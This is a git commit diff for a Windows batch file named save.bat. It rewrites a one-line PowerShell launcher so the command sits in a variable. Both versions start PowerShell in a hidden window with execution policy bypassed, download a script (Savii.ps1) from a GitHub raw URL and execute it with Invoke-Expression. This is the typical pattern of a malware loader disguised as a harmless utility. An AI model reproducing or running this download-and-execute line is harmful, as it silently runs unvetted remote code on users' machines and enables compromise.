3cc7e909baf69a93190e64b1110f2b9b61103019
Caspur <casperautomob@gmail.com>
2026-08-06 22:11:08 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,2 +1,6 @@
 @echo off
-powershell -NoP -NoL -ep Bypass -Win 1 -Command "try { iex (irm https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1) } catch { exit 1 }"
+
+set "pscmd=Invoke-Expression (Invoke-RestMethod https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
+
+powershell -NoP -NoL -ep Bypass -Win 1 -Command "%pscmd%"
+ 
